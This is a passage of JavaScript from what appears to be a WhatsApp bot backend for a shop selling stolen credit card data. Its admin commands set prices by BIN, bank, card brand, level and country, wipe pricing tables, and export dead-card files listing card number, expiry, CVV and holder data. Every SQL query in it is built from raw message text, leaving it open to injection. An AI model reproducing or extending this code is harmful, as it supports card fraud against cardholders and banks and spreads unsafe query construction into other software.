        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/vertabela") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("full") > -1) {
                TIPOCC = "2"
            } else {
                TIPOCC = "1"
            }


            if (Mensagem_Texto.indexOf("nivel") > -1) {
                Categoria = "NIVEL"
            }
            else if (Mensagem_Texto.indexOf("banco") > -1) {
                Categoria = "BANCO"
            }
            else if (Mensagem_Texto.indexOf("bandeira") > -1) {
                Categoria = "BANDEIRA"
            }
            else if (Mensagem_Texto.indexOf("pais") > -1) {
                Categoria = "PAIS"
            }
            else if (Mensagem_Texto.indexOf("bin") > -1) {
                Categoria = "BIN"
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                Array_Montando = []
                if (TIPOCC.toString() === "1") {
                    SQL = `SELECT _rowid_,${Categoria},VALOR FROM CCs_PRECOS_${Categoria}`
                    Array_Montando.push(`*TABELA CC POR ${Categoria}*`)
                } else {
                    SQL = `SELECT _rowid_,${Categoria},VALOR FROM CCs_PRECOS_${Categoria}_FULL`
                    Array_Montando.push(`*TABELA CC FULL DADOS POR ${Categoria}*`)
                }
                Array_Montando.push("")

                db.each(SQL, async (err, Linha) => {
                    Numero_Linha_cc = Linha["rowid"]
                    TIPO_cc = Linha[Categoria]
                    VALOR_cc = Linha["VALOR"]
                    Array_Montando.push(`${Numero_Linha_cc} - ${TIPO_cc} - R\$: ${VALOR_cc}`)
                    Array_Montando.push("")

                }, async () => {
                    // console.log("Fim")

                    if (Mensagem_Texto.indexOf("full") > -1) {
                        Full = "full"
                    } else {
                        Full = ""
                    }

                    Array_Montando.push(`Para alterar o preço digite:

/valorccnivel${Full}===[NÚMERO ${Categoria}]===[NOVO VALOR]

Exemplo: /valorcc${Categoria.toLowerCase()}${Full}===1===10`)

                    Texto = `${Array_Montando.join("\n")}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                })
            })
            return;
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/delinfosbin" && Adms.includes(Numero)) {

            Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS`).all();
            if (Array_CCS.length > 0) {
                Texto = `Este comando deletaria todas as informações de bins registradas... Mas só irá funcionar se não tiver mais nenhuma CC disponível no estoque... Tem atualmente *${Array_CCS.length}* CCs lá.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_NIVEL`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_NIVEL_FULL`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BANDEIRA`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BANDEIRA_FULL`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BANCO`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BANCO_FULL`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_PAIS`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_PAIS_FULL`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BIN`).run();
            await DataBase_Better.prepare(`DELETE FROM CCS_PRECOS_BIN_FULL`).run();
            Texto = `*TODAS AS INFORMAÇÕES DE BINS FORAM DELETADAS...*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorcc") > -1 && Mensagem_Texto.indexOf("===") > -1 && Adms.includes(Numero)) {
            try {

                if (Mensagem_Texto.indexOf("full") > -1) {
                    TIPOCC = "2"
                } else {
                    TIPOCC = "1"
                }

                if (Mensagem_Texto.indexOf("nivel") > -1) {
                    CATEGORIA = "NIVEL"
                }
                if (Mensagem_Texto.indexOf("banco") > -1) {
                    CATEGORIA = "BANCO"
                }
                if (Mensagem_Texto.indexOf("bandeira") > -1) {
                    CATEGORIA = "BANDEIRA"
                }
                if (Mensagem_Texto.indexOf("pais") > -1) {
                    CATEGORIA = "PAIS"
                }
                if (Mensagem_Texto.indexOf("bin") > -1) {
                    CATEGORIA = "BIN"
                }

                msg = Mensagem_Texto.split("===")
                ID = msg[1]
                NOVO_VALOR = msg[2]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (ID === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                if (NOVO_VALOR === "") {

                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                if (TIPOCC.toString() === "1") {
                    PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT VALOR FROM CCs_PRECOS_${CATEGORIA} WHERE _rowid_ = '${ID}'`).get()["VALOR"]
                    PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

                    PARAMETRO = await DataBase_Better.prepare(`SELECT ${CATEGORIA} FROM CCs_PRECOS_${CATEGORIA} WHERE _rowid_ = '${ID}'`).get()[CATEGORIA]

                    await DataBase_Better.prepare(`UPDATE CCs_PRECOS_${CATEGORIA} SET VALOR = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

                    Texto = `Preço CC *${CATEGORIA} - ${PARAMETRO}* alterado com sucesso!

Valor anterior: ${PRECO_ANTERIOR}

Valor atual: ${NOVO_VALOR}`

                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } else {
                    PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT VALOR FROM CCs_PRECOS_${CATEGORIA}_FULL WHERE _rowid_ = '${ID}'`).get()["VALOR"]
                    PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

                    PARAMETRO = await DataBase_Better.prepare(`SELECT ${CATEGORIA} FROM CCs_PRECOS_${CATEGORIA}_FULL WHERE _rowid_ = '${ID}'`).get()[CATEGORIA]

                    await DataBase_Better.prepare(`UPDATE CCs_PRECOS_${CATEGORIA}_FULL SET VALOR = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

                    Texto = `Preço CC FULL DADOS *${CATEGORIA} - ${PARAMETRO}* alterado com sucesso!

Valor anterior: ${PRECO_ANTERIOR}

Valor atual: ${NOVO_VALOR}`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

            } catch (error) {

                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if (Mensagem_Texto.indexOf("/allvalorcc") > -1 && Mensagem_Texto.indexOf("===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            try {
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                if (Mensagem_Texto.indexOf("nivel") > -1) {
                    CATEGORIA = "NIVEL"
                }
                if (Mensagem_Texto.indexOf("banco") > -1) {
                    CATEGORIA = "BANCO"
                }
                if (Mensagem_Texto.indexOf("bandeira") > -1) {
                    CATEGORIA = "BANDEIRA"
                }
                if (Mensagem_Texto.indexOf("pais") > -1) {
                    CATEGORIA = "PAIS"
                }
                if (Mensagem_Texto.indexOf("bin") > -1) {
                    CATEGORIA = "BIN"
                }

                NOVO_VALOR = msg[1]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (Mensagem_Texto.indexOf("full") > -1) {
                    await DataBase_Better.prepare(`UPDATE CCs_PRECOS_${CATEGORIA}_FULL SET VALOR = '${NOVO_VALOR}'`).run()
                    Texto = `*TODOS OS NÍVEIS DAS *CCs FULL* TIVERAM SEUS PREÇOS ALTERADOS PARA R$:${NOVO_VALOR}*`
                } else {
                    await DataBase_Better.prepare(`UPDATE CCs_PRECOS_${CATEGORIA} SET VALOR = '${NOVO_VALOR}'`).run()
                    Texto = `*TODOS OS NÍVEIS DAS *INFO CCs* TIVERAM SEUS PREÇOS ALTERADOS PARA R$:${NOVO_VALOR}*`
                }
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/baixarestoqueccsdie") > -1 && Adms.includes(Numero)) {
            if (Mensagem_Texto.indexOf("full") > -1) {
                TIPOCC = "2"
                Texto = `*GERANDO ARQUIVO DE CCS [DIE] (FULL DADOS)...*

*FORMATO:*
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS - DADOS(Que você colocou)*`
            } else {
                TIPOCC = "1"
                Texto = `*GERANDO ARQUIVO DE INFO CCS [DIE]...*

*FORMATO:*
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS - DADOS(Que você colocou)*`
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS_DIE WHERE TIPOCC = '${TIPOCC}'`).all();
            //shuffle(Array_CCS);

            today = new Date();
            today.setHours(today.getHours() + 0);
            if (Mensagem_Texto.indexOf("full") > -1) {
                Nome_File_Visual = `${Nome_Dono} ${Array_CCS.length} CCs FULL DADOS DIE ${today}.txt`
            } else {
                Nome_File_Visual = `${Nome_Dono} ${Array_CCS.length} INFO CCs DIE ${today}.txt`
            }
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');
            Nome_File = __dirname + `\\PacotesMIX\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_CCS.length; index++) {
                console.log(`${Array_CCS[index]["NUMERO"]}|${Array_CCS[index]["MES"]}|${Array_CCS[index]["ANO"]}|${Array_CCS[index]["CVV"]} - ${Array_CCS[index]["BANDEIRA"]} - ${Array_CCS[index]["TIPO"]} - ${Array_CCS[index]["NIVEL"]} - ${Array_CCS[index]["BANCO"]} - ${Array_CCS[index]["PAIS"]} - ${Array_CCS[index]["DADOS"]}\n`)
                message.write(`${Array_CCS[index]["NUMERO"]}|${Array_CCS[index]["MES"]}|${Array_CCS[index]["ANO"]}|${Array_CCS[index]["CVV"]} - ${Array_CCS[index]["BANDEIRA"]} - ${Array_CCS[index]["TIPO"]} - ${Array_CCS[index]["NIVEL"]} - ${Array_CCS[index]["BANCO"]} - ${Array_CCS[index]["PAIS"]} - ${Array_CCS[index]["DADOS"]}\n`)
                if (index === parseInt(Array_CCS.length) - 1) {
                    //console.log("Foi")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
